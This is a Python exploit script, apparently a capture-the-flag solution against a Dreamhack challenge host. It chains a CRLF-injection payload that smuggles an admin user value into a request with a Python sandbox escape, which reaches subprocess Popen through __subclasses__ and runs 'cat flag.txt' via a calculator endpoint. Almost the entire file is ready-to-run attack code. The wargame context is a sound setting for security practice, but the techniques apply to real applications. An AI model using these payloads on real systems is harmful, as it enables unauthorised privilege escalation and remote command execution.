import requests

URL = "http://host3.dreamhack.games:19478"
session = requests.Session()
def get_admin():
    payload = "/api/test%0D%0A%0D%0Auser=admin%0D%0A%0D%0A"
    target_url = f"{URL}{payload}"
    print(f"[*] Get-admin payload: {target_url}")
    try:
        session.get(target_url)
    except Exception as e:
        print(f"[-] Error: {e}")
    response = session.get(f"{URL}/whoami")
    print(f"[*] Check: {response.text}")
    
def RCE():
    payload = (
        "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'Popen'][0]('cat flag.txt', shell=True, stdout=-1).communicate()[0]"
    )
    target_url = f"{URL}/calc?text=1%2B1&text={payload}"
    print(f"[*] RCE: {target_url}")
    try:
        r = session.get(target_url)
        print(r.text)
    except Exception as e:
        print(f"[-] Error: {e}")
        
if __name__ == "__main__":
    get_admin()
    RCE()